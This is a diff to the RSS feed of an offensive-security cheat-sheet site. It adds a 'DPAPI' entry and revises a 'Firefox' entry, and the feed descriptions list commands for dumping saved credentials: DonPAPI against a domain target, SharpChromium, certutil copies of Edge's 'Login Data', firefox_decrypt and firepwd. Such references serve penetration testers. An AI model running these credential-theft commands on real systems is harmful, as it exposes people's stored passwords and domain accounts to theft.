@@ -8,11 +8,18 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/@password/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>DPAPI</title>
+      <link>https://tldrbins.github.io/dpapi/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/dpapi/</guid>
+      <description>Auto dump all (From Linux) DonPAPI&#xA;DonPAPI collect -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -t &amp;lt;TARGET&amp;gt; Browser Saved Creds Auto SharpChromium.exe&#xA;.\SharpChromium.exe logins Manual (e.g. Edge) # Get Local State json file, copy and paste to local Linux type &amp;#34;C:\Users\[USER]\appdata\local\microsoft\edge\User Data\Local State&amp;#34; # Get Login Data binary file certutil -encode &amp;#34;C:\Users\[USER]\appdata\local\microsoft\edge\User Data\Default\Login Data&amp;#34; C:\Windows\Tasks\logindata # Copy and paste to local Linux type C:\Windows\Tasks\logindata # Base64 decode cat logindata_b64 | base64 -d &amp;gt; logindata # Extract key from local state cat localstate | jq -r .</description>
+    </item>
+    <item>
       <title>Firefox</title>
       <link>https://tldrbins.github.io/firefox/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/firefox/</guid>
-      <description> Extract saved passwords Download firefox_decrypt&#xA;# Auto detect path python firefox_decrypt.py # Specify path python firefox_decrypt.py /folder/containing/profiles.ini/ </description>
+      <description> Extract saved passwords firefox_decrypt&#xA;# Auto detect path python3 firefox_decrypt.py # Specify path python3 firefox_decrypt.py /folder/containing/profiles.ini/ firepwd&#xA;# With key4.db, logins.json in the same directory python3 firepwd.py </description>
     </item>
     <item>
       <title>Hydra</title>
